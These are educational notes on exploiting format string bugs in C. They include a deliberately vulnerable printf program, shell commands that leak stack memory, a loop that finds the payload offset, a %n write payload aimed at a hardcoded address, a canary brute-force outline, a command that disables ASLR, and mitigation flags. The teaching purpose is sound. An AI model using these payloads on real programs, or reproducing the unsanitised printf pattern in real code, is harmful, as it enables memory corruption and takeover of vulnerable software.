# Format String Bugs Exploitation Notes

## 1. Introduction to Format String Vulnerabilities

**Vulnerable Example:**
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    if (argc < 2) return EXIT_FAILURE;
    printf(argv[1]); // Vulnerable!
    return EXIT_SUCCESS;
}
```

**Demonstration:**
```bash
./vulnerable 'hello'          # Output: hello
./vulnerable '%x'             # Leaks stack content
./vulnerable '%x.%x.%x'       # Leaks multiple stack values
```

**Why Dangerous?**
- Allows arbitrary reading and writing in memory.

---

## 2. Variadic Functions & Stack Interaction

Variadic functions (`printf`, `sprintf`, etc.) allow exploitation by misusing format specifiers to access stack data.

**Common vulnerable functions:**
- `printf`, `fprintf`, `sprintf`, `snprintf`, `syslog`, etc.

---

## 3. Important Format Specifiers

### Read Specifiers:
| Specifier | Description                    |
|-----------|--------------------------------|
| `%d`      | Decimal integer                |
| `%x`      | Hexadecimal integer            |
| `%s`      | String                         |
| `%p`      | Pointer (hexadecimal)          |

### Write Specifiers (for exploitation):
| Specifier | Description                            |
|-----------|----------------------------------------|
| `%n`      | Write number of chars printed (4 bytes)|
| `%hn`     | Write number of chars (2 bytes)        |
| `%hhn`    | Write number of chars (1 byte)         |

### Direct Stack Access:
- `%3$x`: Access 3rd argument on stack directly.

---

## 4. Basic Exploitation Steps

### Step 1: Reading Memory
```bash
./vulnerable '%x %x %x'  # Reads multiple stack entries
```

### Step 2: Overwriting Memory (`%n`)
Goal: Overwrite integer value at specific memory location.

#### Example:
```c
void foo(char *string) {
    int target = 0; // Overwrite here!
    printf(string);
    if (target == 0xdeadbeef)
        printf("You win!\n");
}
```

Exploit steps:
1. Insert address of `target` in payload.
2. Locate payload address on stack.
3. Replace `%x` with `%n` to write data.

#### Finding correct index:
```bash
for i in $(seq 1 50); do 
    echo "$i: $(./vuln "$(echo -e "AAAA%$i\$x")")"
done
# Look for output: 41414141 (hex for 'AAAA')
```

Exploit payload:
```bash
./vuln "$(echo -e "\x78\xd0\xff\xff%7\$n")"
```

---

## 5. Stack-Smashing Protector (Canary)

### Principle:
- Canary: A random value placed on stack to detect buffer overflow.

### GCC Stack Protector Options:
- `-fstack-protector`: Adds basic canaries.
- `-fstack-protector-strong`: Adds protection to more functions.
- `-fstack-protector-all`: Protects all functions.

### Canary Bypass (fork server scenario):
- Brute-force byte-by-byte (max 1024 attempts).

---

## 6. Mitigations & Countermeasures

### Compiler Checks:
```bash
gcc -Wformat -Wformat-overflow -Wformat-security
```

- Use static code analysis and safe coding practices.
- Avoid using unsanitized user inputs as format strings.

---

## 7. Real-world Example (Automotive Industry)

- Format string vulnerability in BMW, Audi, Mercedes Bluetooth registration systems.
- Attacker-controlled Bluetooth names trigger exploit.

---

## 8. Practical Exploitation Tips:

- Disable ASLR (`echo 0 > /proc/sys/kernel/randomize_va_space`) for controlled testing.
- Always test in safe environments (e.g., VMs).
